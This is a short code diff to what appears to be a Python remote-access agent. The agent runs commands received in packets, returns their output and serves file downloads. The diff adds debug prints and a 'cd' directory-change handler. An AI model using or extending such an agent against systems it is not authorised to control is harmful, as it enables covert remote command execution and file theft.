@@ -313,9 +313,11 @@ def process_packet(packetType, data, resultID):
             print(str(type(parts)))
             cmd = parts[0]
             cmdargs = ' '.join(parts[1:len(parts)])
+            print(cmd)
+            print(parts[1])
             resultData = str(run_command(cmd, cmdargs=cmdargs))
             send_message(build_response_packet(40, resultData + "\r\n ..Command execution completed.", resultID))
-        print('type 40 not the issue')
+
     elif packetType == 41:
         # file download
         objPath = os.path.abspath(data)
@@ -982,7 +984,9 @@ def run_command(command, cmdargs=None):
             cmdargs = '.'
 
         return directory_listing(cmdargs)
-
+    if re.compile("cd").match(command):
+        os.chdir(cmdargs)
+        return str(os.getcwd())
     elif re.compile("pwd").match(command):
         return str(os.getcwd())
     elif re.compile("rm").match(command):
